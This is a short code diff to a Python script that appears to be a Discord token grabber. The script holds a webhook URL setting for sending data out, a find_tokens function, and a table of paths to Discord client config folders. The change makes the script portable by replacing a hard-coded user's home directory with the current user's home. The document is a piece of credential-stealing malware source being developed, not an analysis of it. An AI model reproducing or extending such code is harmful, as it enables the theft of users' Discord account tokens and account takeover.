@@ -3,6 +3,7 @@ import re
 import json
 from sys import platform
 import requests
+from pathlib import Path
 # your webhook URL
 WEBHOOK_URL = ''
 
@@ -37,7 +38,7 @@ def find_tokens(path, platform):
 
 def main(platform):
     if platform == "linux" or platform == "linux2":
-        configdir = "/home/amirmahdi/.config"
+        configdir = str(Path.home()) + "/.config"
         paths = {
             'Discord': configdir + '/Discord',
             'Discord Canary': configdir + '/discordcanary',
